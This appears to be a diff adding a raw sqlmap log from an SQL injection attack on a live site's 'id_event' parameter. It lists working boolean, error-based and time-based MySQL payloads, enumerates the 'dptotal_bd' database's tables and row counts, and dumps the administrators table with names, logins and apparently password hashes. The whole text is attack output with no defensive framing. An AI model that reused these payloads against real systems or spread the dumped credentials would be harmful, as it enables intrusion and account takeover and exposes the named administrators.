@@ -1,0 +1,155 @@
+sqlmap identified the following injection point(s) with a total of 467 HTTP(s) requests:
+---
+Parameter: id_event (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_event=50 AND 1599=1599
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_event=50 AND (SELECT 6174 FROM(SELECT COUNT(*),CONCAT(0x7162717671,(SELECT (ELT(6174=6174,1))),0x716a707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_event=50 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] dptotal_bd
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_event (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_event=50 AND 1599=1599
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_event=50 AND (SELECT 6174 FROM(SELECT COUNT(*),CONCAT(0x7162717671,(SELECT (ELT(6174=6174,1))),0x716a707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_event=50 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0
+Database: dptotal_bd
+[35 tables]
++----------------------+
+| acessos              |
+| administradores      |
+| areas                |
+| banner               |
+| clientes             |
+| clientes_depoimentos |
+| clientes_imagens     |
+| clientes_videos      |
+| clima                |
+| contato              |
+| curriculo            |
+| desempenho           |
+| desligamento         |
+| empresa              |
+| empresa_imagens      |
+| equipe               |
+| equipe_imagens       |
+| equipe_videos        |
+| evento_cadastro      |
+| evento_cadastro_emp  |
+| evento_imagens       |
+| eventos              |
+| noticias             |
+| parceiros            |
+| participar           |
+| publicacoes          |
+| satisfacao           |
+| servicos             |
+| servicos_imagens     |
+| servicos_realizados  |
+| teste                |
+| tipos_clientes       |
+| tipos_servicos       |
+| treinamento          |
+| vagas                |
++----------------------+
+
+Database: dptotal_bd
++----------------------+---------+
+| Table                | Entries |
++----------------------+---------+
+| contato              | 1177    |
+| evento_cadastro      | 577     |
+| clientes_imagens     | 533     |
+| curriculo            | 450     |
+| evento_cadastro_emp  | 268     |
+| servicos_realizados  | 227     |
+| vagas                | 227     |
+| evento_imagens       | 144     |
+| servicos_imagens     | 120     |
+| clientes             | 102     |
+| participar           | 83      |
+| equipe_imagens       | 59      |
+| clientes_depoimentos | 58      |
+| servicos             | 24      |
+| treinamento          | 16      |
+| eventos              | 11      |
+| publicacoes          | 11      |
+| areas                | 9       |
+| equipe_videos        | 9       |
+| noticias             | 7       |
+| teste                | 5       |
+| tipos_servicos       | 5       |
+| administradores      | 4       |
+| equipe               | 4       |
+| banner               | 3       |
+| parceiros            | 3       |
+| clientes_videos      | 2       |
+| empresa_imagens      | 2       |
+| tipos_clientes       | 2       |
+| clima                | 1       |
+| desempenho           | 1       |
+| empresa              | 1       |
+| satisfacao           | 1       |
++----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_event (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_event=50 AND 1599=1599
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_event=50 AND (SELECT 6174 FROM(SELECT COUNT(*),CONCAT(0x7162717671,(SELECT (ELT(6174=6174,1))),0x716a707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_event=50 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0
+Database: dptotal_bd
+Table: administradores
+[4 entries]
++--------+--------------------------------------+------------------------+----------------------------------+-----------+-------------+---------------------+
+| adm_id | adm_img                              | adm_nome               | adm_senha                        | adm_login | adm_acessos | adm_ultimo_login    |
++--------+--------------------------------------+------------------------+----------------------------------+-----------+-------------+---------------------+
+| 10     | bb8066580d600e1698d780add36a62ba.jpg | Administrador Monteweb | 6245782bdd35cd512e84ba4af47af9b4 | monteweb  | 385         | 2013-07-22 14:50:04 |
+| 14     | <blank>                              | DPTOTAL                | efdb15c43879d8958808ff46feb536cc | dptotal   | 181         | 2016-01-18 13:19:20 |
+| 15     | <blank>                              | Douglas Camillo        | a1803f93389c18e1fe261572c12ad1be | douglas   | 14          | 2014-10-10 15:45:36 |
+| 16     | <blank>                              | Camillo                | 83d7557729c7091c891eb8f9ab817349 | Camillo   | 23          | 2018-10-29 16:55:15 |
++--------+--------------------------------------+------------------------+----------------------------------+-----------+-------------+---------------------+
+
